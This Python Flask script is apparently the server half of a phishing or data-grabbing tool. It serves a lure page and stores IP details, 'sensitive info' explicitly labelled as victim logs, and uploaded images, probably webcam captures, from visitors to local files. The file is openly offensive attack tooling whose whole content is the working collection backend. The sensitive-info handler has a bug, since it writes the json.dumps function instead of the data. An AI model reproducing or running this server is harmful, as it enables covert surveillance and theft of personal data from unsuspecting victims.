from colorama import Fore
from flask import Flask, request, jsonify,Response


import json
import logging
import time
import os


log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)


PATH_TO_IMAGES_DIR = 'image'
PATH_TO_IP_FILE = 'ipinfo.txt'
PATH_TO_SENSITIVE_INFO_FILE = 'sensitiveinfo.txt'


app = Flask(__name__)


@app.before_first_request()
def init_app():
  if(os.path.exists(PATH_TO_IMAGES_DIR)):
       print('present')
  else:
      os.mkdir('image')


@app.route('/')
def index():
   return Response(open('index.html').read(), mimetype="text/html")


@app.route('/ipinfo',methods=['POST'])
def ipinfos():
  result = {"message":"json data needed"}
  
  if request.is_json:
    iplogs = request.get_json()

    try:
      with open(PATH_TO_IP_FILE, 'a') as f:
        f.write(f'\n{json.dumps(iplogs)}\n')
        
        print(Fore.MAGENTA + "----------------------------------------------------")
        print("")     
        print(Fore.RED  + "Ip Logs saved to **ipinfo.txt** ")  
        print("")
        print(Fore.MAGENTA + "----------------------------------------------------")
        print(" ")
        result = {'processed': 'true'}

    except Exception as e:
      print(f'{Fore.RED}ERROR: {e}')

    return jsonify(result)


@app.route('/process_qtc', methods=['POST', 'GET'])
def getvictimlogs():
  result = {"message":"json data needed"}

  if request.method == "POST" and request.is_json:
    logs = request.get_json()
    try:
      with open(PATH_TO_SENSITIVE_INFO_FILE,'a') as f:
        f.write(f"\n{json.dumps}\n")

        print(logs)
        print("")
        print(Fore.MAGENTA + "----------------------------------------------------")
        print("")     
        print(Fore.RED  + "Victim Logs saved  to **sensitiveinfo.txt**")  
        print("")
        print(Fore.MAGENTA + "----------------------------------------------------")
      
        result = {'processed': 'true'}

    except Exception as e:
      print(f'{Fore.RED}ERROR: {e}')

  return jsonify(result)   


@app.route('/image', methods=['POST'])
def image():
    i = request.files['image']  # get the image
    f = ('%s.jpeg' % time.strftime("%Y%m%d-%H%M%S"))
    i.save('%s/%s' % (PATH_TO_IMAGES_DIR, f))
    print(Fore.YELLOW + "Image Saved Successfully")

    return Response(f"{f} saved")


if __name__ == "__main__":
  app.run(debug=False,host='0.0.0.0')
